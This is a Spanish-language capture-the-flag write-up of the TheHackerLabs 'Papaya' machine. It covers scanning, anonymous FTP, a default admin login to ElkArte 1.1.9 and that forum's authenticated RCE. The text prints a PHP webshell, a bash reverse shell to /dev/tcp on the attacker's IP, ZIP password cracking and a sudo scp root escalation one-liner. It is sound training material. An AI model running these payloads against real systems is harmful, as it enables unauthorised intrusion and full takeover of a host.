---
title: "Papaya - TheHackerLabs"
date: 2025-05-06
draft: false
slug: "THL-writeup-papaya"
excerpt: "Esta fue una máquina sencilla, pero que necesitas comprender bien el Exploit. Después de analizar los escaneos y de caer en un engaño de un archivo de texto con una cadena en ROT13, analizamos la página web activa que está ocupando el software ElkArte Forum, siendo que descubrimos la versión que se está ocupando y que existe un Exploit para esta. Logramos entrar al login de ElkArte Forum como el usuario admin con credenciales simples por defecto y aplicamos el Exploit, logrando subir una WebShell de PHP, que nos permite obtener una Reverse Shell, con lo que ganamos acceso principal a la máquina víctima. Dentro de la máquina, encontramos un archivo ZIP que logramos crackear y obtener su contenido, siendo la contraseña de un usuario registrado en la máquina. Revisando los privilegios de este usuario, encontramos que podemos usar el binario scp como Root. Buscando en la guía de GTFOBins, encontramos la forma de poder escalar privilegios con este binario y así logramos convertirnos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "ElkArte Forum", "FTP", "Virtual Hosting", "FTP Enumeration", "ROT13 Decodification", "Default Credentials", "Remote Code Execution (RCE) (Authenticated)", "Cracking Hash", "Cracking ZIP", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "nano"
  - "wappalizer"
  - "searchsploit"
  - "PHP"
  - "zip"
  - "nc"
  - "Bash"
  - "Python3"
  - "wget"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "cat"
links:
  - "https://www.elkarte.net/"
  - "https://www.exploit-db.com/exploits/52026"
  - "https://gtfobins.github.io/gtfobins/scp/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-papaya/papaya.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.30
PING 192.168.10.30 (192.168.10.30) 56(84) bytes of data.
64 bytes from 192.168.10.30: icmp_seq=1 ttl=64 time=1.65 ms
64 bytes from 192.168.10.30: icmp_seq=2 ttl=64 time=1.05 ms
64 bytes from 192.168.10.30: icmp_seq=3 ttl=64 time=2.50 ms
64 bytes from 192.168.10.30: icmp_seq=4 ttl=64 time=1.29 ms

--- 192.168.10.30 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3421ms
rtt min/avg/max/mdev = 1.054/1.621/2.495/0.546 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.30 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 18:36 CST
Initiating ARP Ping Scan at 18:36
Scanning 192.168.10.30 [1 port]
Completed ARP Ping Scan at 18:36, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:36
Scanning 192.168.10.30 [65535 ports]
Discovered open port 21/tcp on 192.168.10.30
Discovered open port 22/tcp on 192.168.10.30
Discovered open port 80/tcp on 192.168.10.30
Completed SYN Stealth Scan at 18:36, 13.72s elapsed (65535 total ports)
Nmap scan report for 192.168.10.30
Host is up, received arp-response (0.00085s latency).
Scanned at 2025-05-05 18:36:43 CST for 14s
Not shown: 58300 closed tcp ports (reset), 7232 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
           Raw packets sent: 79009 (3.476MB) | Rcvd: 58304 (2.332MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo 3 puertos activos, pero me da curiosidad ver el **puerto 21** activo.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80 192.168.10.30 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 18:37 CST
Nmap scan report for 192.168.10.30
Host is up (0.00066s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp

| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (Debian) [::ffff:192.168.10.30]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (Debian) [::ffff:192.168.10.30]
|     214-Se reconocen las siguiente 
|     rdenes (* =>'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@papaya
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Debian) [::ffff:192.168.10.30]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp            19 Jul  2  2024 secret.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 bb:05:10:69:18:eb:e3:44:2c:a7:68:98:d0:97:01:20 (ECDSA)
|_  256 65:41:aa:54:a6:b7:f7:2a:04:2e:c4:6a:c0:4d:10:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.59

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Did not follow redirect to http://papaya.thl/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=5/5%Time=681959C8%P=x86_64-pc-linux-gnu%r(NULL,
SF:37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.10\
SF:.30\]\r\n")%r(GenericLines,99,"220\x20Servidor\x20ProFTPD\x20\(Debian\)
SF:\x20\[::ffff:192\.168\.10\.30\]\r\n500\x20Orden\x20incorrecta:\x20Inte
SF:nta\x20ser\x20m\xc3\xa1s\x20creativo\r\n500\x20Orden\x20incorrecta:\x20
SF:Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n")%r(Help,275,"220\x20Servi
SF:dor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.10\.30\]\r\n214-Se\
SF:x20reconocen\x20las\x20siguiente\x20\xc3\xb3rdenes\x20\(\*\x20=>'s\x20n
SF:o\x20implementadas\):\r\n\x20CWD\x20\x20\x20\x20\x20XCWD\x20\x20\x20\x2
SF:0CDUP\x20\x20\x20\x20XCUP\x20\x20\x20\x20SMNT\*\x20\x20\x20QUIT\x20\x20
SF:\x20\x20PORT\x20\x20\x20\x20PASV\x20\x20\x20\x20\r\n\x20EPRT\x20\x20\x2
SF:0\x20EPSV\x20\x20\x20\x20ALLO\x20\x20\x20\x20RNFR\x20\x20\x20\x20RNTO\x
SF:20\x20\x20\x20DELE\x20\x20\x20\x20MDTM\x20\x20\x20\x20RMD\x20\x20\x20\x
SF:20\x20\r\n\x20XRMD\x20\x20\x20\x20MKD\x20\x20\x20\x20\x20XMKD\x20\x20\x
SF:20\x20PWD\x20\x20\x20\x20\x20XPWD\x20\x20\x20\x20SIZE\x20\x20\x20\x20SY
SF:ST\x20\x20\x20\x20HELP\x20\x20\x20\x20\r\n\x20NOOP\x20\x20\x20\x20FEAT\
SF:x20\x20\x20\x20OPTS\x20\x20\x20\x20HOST\x20\x20\x20\x20CLNT\x20\x20\x20
SF:\x20AUTH\*\x20\x20\x20CCC\*\x20\x20\x20\x20CONF\*\x20\x20\x20\r\n\x20EN
SF:C\*\x20\x20\x20\x20MIC\*\x20\x20\x20\x20PBSZ\*\x20\x20\x20PROT\*\x20\x2
SF:0\x20TYPE\x20\x20\x20\x20STRU\x20\x20\x20\x20MODE\x20\x20\x20\x20RETR\x
SF:20\x20\x20\x20\r\n\x20STOR\x20\x20\x20\x20STOU\x20\x20\x20\x20APPE\x20\
SF:x20\x20\x20REST\x20\x20\x20\x20ABOR\x20\x20\x20\x20RANG\x20\x20\x20\x20
SF:USER\x20\x20\x20\x20PASS\x20\x20\x20\x20\r\n\x20ACCT\*\x20\x20\x20REIN\
SF:*\x20\x20\x20LIST\x20\x20\x20\x20NLST\x20\x20\x20\x20STAT\x20\x20\x20\x
SF:20SITE\x20\x20\x20\x20MLSD\x20\x20\x20\x20MLST\x20\x20\x20\x20\r\n214\x
SF:20Env\xc3\xada\x20comentario\x20a\x20root@papaya\r\n")%r(SSLSessionReq,
SF:37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.10\
SF:.30\]\r\n")%r(SMBProgNeg,37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\x
SF:20\[::ffff:192\.168\.10\.30\]\r\n");
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts: Servidor, 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.88 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, parece que para el **servicio FTP** pudo loguearse usando al **usuario anonymous** y pudo encontrar un archivo de texto. Por lo demás, parece que la página web ocupa **virtual hosting**, ya que aparece un dominio llamado **papaya.thl**, pero esto lo comprobaremos después de enumerar el **FTP**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio FTP y Decodificación de Texto en ROT13 {#FTP}

Entremos:
```bash
ftp 192.168.10.30
Connected to 192.168.10.30.
220 Servidor ProFTPD (Debian) [::ffff:192.168.10.30]
Name (192.168.10.30:berserkwings): anonymous
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Bien, deberíamos poder ver el mismo archivo que nos reportó el escaneo:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||20933|)
150 Abriendo conexión de datos en modo ASCII para file list
-rw-r--r--   1 ftp      ftp            19 Jul  2  2024 secret.txt
226 Transferencia completada
```
Ahí está.

Vamos a descargarlo:
```bash
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||1451|)
150 Opening BINARY mode data connection for secret.txt (19 bytes)
100% |********************************|    19        1.71 KiB/s    00:00 ETA
226 Transferencia completada
19 bytes received in 00:00 (1.36 KiB/s)
ftp> exit
221 Hasta luego
```

Y veamos qué contiene:
```bash
cat secret.txt
ndhvabunlanqnpbñb
```
Curioso, parece que es un texto codificado, como si fuera **base64**, pero este caso no lo es.

Intentando varias pruebas con **CyberChef**, descubrimos que fue codificado con **ROT13**:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura1.png">
</p>

Solamente es un mensaje simple, no hay ninguna pista.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura2.png">
</p>

Como lo había mencionado antes, se está aplicando **Virtual Hosting**.

Agreguemos el dominio y la IP de la máquina al `/etc/hosts`:

```bash
nano /etc/hosts
----------
192.168.10.30 papaya.thl
```

Recarga la página y ya debería verse bien:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura3.png">
</p>

Podemos observar en la parte inferior izquierda, que estamos en una página llamada **ElkArte** y vemos su versión que es **1.1.9**.

Investiguemos esta página:

| **ElkArte Software** |
|:-----------:|
| *ElkArte es un software moderno y potente para crear foros comunitarios. Es completamente gratuito y cuenta con una licencia de código abierto con cláusula BSD-3. Inicialmente basado en Simple Machines Forum (SMF), comenzó como una revisión del código para modernizarlo, implementar nuevas funciones y hacer que el software de foros fuera más relevante en una era de interacción social sin precedentes.* |

Entonces, es un programa que sirve como un foro en general.

Podemos intentar buscar archivos ocultos aplicando **Fuzzing**, pero no encontraremos algo que nos ayude como tal.

Lo que sí sabemos, es que el software trabaja con **PHP**, gracias a **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura4.png">
</p>

Además, vemos que hay una publicación de un usuario llamado **Elkarte** y también vemos al usuario **admin**:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura5.png">
</p>

Podríamos tratar de aplicar fuerza bruta al login, pero hay **cookies dinámicas** y parece tener protección contra **CSRF**, por lo que se vuelve muy complicado aplicar fuerza bruta.

Vamos a buscar un Exploit para la versión que se está ocupando de **ElkArte**.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: ElkArte Forum 1.1.9 - Remote Code Execution (RCE) (Authenticated) {#elkarteExploit}

Busquemos un Exploit con **searchsploit**:
```bash
searchsploit elkarte 1.1.9
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
ElkArte Forum 1.1.9 - Remote Code Execution (RCE) (Authenticated)                                                                                           | php/webapps/52026.txt

|---|---|
Shellcodes: No Results
```
Encontramos uno y resulta ser un **RCE**, pero se necesita estar autenticado.

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
searchsploit -m php/webapps/52026.txt
  Exploit: ElkArte Forum 1.1.9 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/52026
     Path: /usr/share/exploitdb/exploits/php/webapps/52026.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
```
Analicemos el Exploit.

Observa lo siguiente:
```bash
1) After login go to Manage and Install theme > https://127.0.0.1/ElkArte/index.php?action=admin;area=theme;sa=admin;c2e3e39a0d=276c2e3e39a0d65W2qg1voAFfX1yNc5m
2) Upload test.zip file and click install > test.zip > test.php > <?php echo system('id'); ?>
3) Go to Theme Setting > Theme Directory > https://127.0.0.1/ElkArte/themes/test/test.php
```
Tenemos 3 pasos a seguir para que podamos subir una **WebShell de PHP**.

Apliquémoslo.

Primero, podemos utilizar credenciales por defecto contra el usuario **admin**, siendo que descubrimos que su contraseña es **password**:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura6.png">
</p>

Estamos dentro. Recuerda que las credenciales son: **admin:password**.

Creamos la **WebShell de PHP**:
```php
<?php
        system($_GET['cmd']);
?>
```

Comprimimos esta **WebShell** en un **archivo ZIP**:
```bash
zip cmd.zip cmd.php
  adding: cmd.php (deflated 10%)
```
Con esto listo, podemos subir el **archivo ZIP** como un tema.

Sigue las siguientes imágenes para poder subir el tema:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura10.png">
</p>

Listo, deberíamos obtener un mensaje de éxito:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura11.png">
</p>

Y ahí está.

Podemos identificar la ruta del tema que acabamos de instalar:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura12.png">
</p>

El Exploit da a entender que cuando subes el archivo comprimido, se descomprime y se instala el contenido, por lo que deberíamos poder visitar nuestra **WebShell de PHP**:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura13.png">
</p>

Funciona a la perfección, ahora podemos aplicar una **Reverse Shell**.

Abre una **netcat** como un listener:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell** de **Bash** y ejecútala:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.30] 52184
bash: cannot set terminal process group (569): Inappropriate ioctl for device
bash: no job control in this shell
www-data@papaya:/var/www/html/elkarte/themes/cmd$ whoami
whoami
www-data
```
Estamos dentro.

Obtén una sesión interactiva, aunque no será necesario para continuar:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z
stty raw -echo; fg

# Paso 3:
reset -> xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Listo.

En este punto, aún no podremos ver la flag del usuario, por lo que debemos escalar privilegios o pivotear al usuario de la máquina víctima.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima y Crackeo de Archivo ZIP {#enumLin}

Si revisamos el directorio `/home`, encontramos el directorio del **usuario papaya**, pero no podremos entrar a este:
```bash
www-data@papaya:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Jul  2  2024 .
drwxr-xr-x 18 root   root   4096 Jul  2  2024 ..
drwx------  3 papaya papaya 4096 Jul  2  2024 papaya
```

Revisando un poco más, encontramos un **archivo ZIP** en el directorio `/opt`:
```bash
www-data@papaya:/home$ ls -la /opt
ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Jul  2  2024 .
drwxr-xr-x 18 root root 4096 Jul  2  2024 ..
-rwxr-xr-x  1 root root  173 Jul  2  2024 pass.zip
```
Vamos a descargarlo en nuestra máquina.

Comprobemos si tenemos **Python3**:
```bash
www-data@papaya:/opt$ which python3
which python3
/usr/bin/python3
```
Lo tenemos.

Podemos levantar un servidor con **Python3** en el directorio `/opt`:
```bash
www-data@papaya:/opt$ python3 -m http.server 8080
python3 -m http.server 8080
```

Y descargamos el **archivo ZIP** con **wget**:
```bash
wget http://192.168.10.30:8080/pass.zip
--2025-05-06 03:15:41--  http://192.168.10.30:8080/pass.zip
Conectando con 192.168.10.30:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 173 [application/zip]
Grabando a: «pass.zip»
.
pass.zip    100%[================>]     173  --.-KB/s    en 0.001s  
.
2025-05-06 03:15:41 (282 KB/s) - «pass.zip» guardado [173/173]
```

Tratemos de descomprimirlo:
```bash
unzip pass.zip
Archive:  pass.zip
[pass.zip] pass.txt password:
```
Nos pide una contraseña.

Vamos a crackear este **archivo ZIP**, por lo que necesitamos primero el hash del archivo que podemos obtener con la herramienta **zip2john**:
```bash
zip2john pass.zip > hash
ver 2.0 pass.zip/pass.txt PKZIP Encr: cmplen=23, decmplen=11, crc=EEA46B01 ts=89BB cs=eea4 type=0
```
Listo.

Crackeamos el hash con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jesica           (pass.zip/pass.txt)     
1g 0:00:00:00 DONE (2025-05-06 03:19) 25.00g/s 307200p/s 307200c/s 307200C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Intentemos descomprimir otra vez el **archivo ZIP** usando la contraseña:
```bash
unzip pass.zip
Archive:  pass.zip
[pass.zip] pass.txt password: 
 extracting: pass.txt
```
Obtuvimos un archivo de texto.

Al leerlo, vemos que parece ser una contraseña:
```bash
cat pass.txt
******
```

Probémosla con el **usuario papaya** para autenticarnos vía **SSH**:
```bash
ssh papaya@192.168.10.30
papaya@192.168.10.30's password: 
Linux papaya 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64
...
...
Last login: Tue May  6 08:08:03 2025
papaya@papaya:~$ whoami
papaya
```
Estamos dentro.

Ahora sí, podemos obtener la flag del usuario:
```bash
papaya@papaya:~$ ls
user.txt
papaya@papaya:~$ cat user.txt
...
```

### Escalando Privilegios con Binario SCP {#scp}

Si revisamos los privilegios de nuestro usuario, encontramos que podemos usar el **binario scp** como **Root**:
```bash
papaya@papaya:~$ sudo -l
Matching Defaults entries for papaya on papaya:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User papaya may run the following commands on papaya:
    (root) NOPASSWD: /usr/bin/scp
```

Podemos buscar una forma de escalar privilegios con este binario en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/scp/" target="_blank">GTFOBins: scp</a>

Aquí está:

<p align="center">
<img src="/assets/images/THL-writeup-papaya/Captura14.png">
</p>

Apliquemos los pasos en un oneliner:
```bash
papaya@papaya:~$ TF=$(mktemp) && echo 'bash 0<&2 1>&2' > "$TF" && chmod +x "$TF" && sudo scp -S "$TF" x y:
root@papaya:/home/papaya# whoami
root
```
Genial, ya somos **Root**.

Busquemos la última flag:
```bash
root@papaya:/home/papaya# cd /root
root@papaya:~# ls
root.txt
root@papaya:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
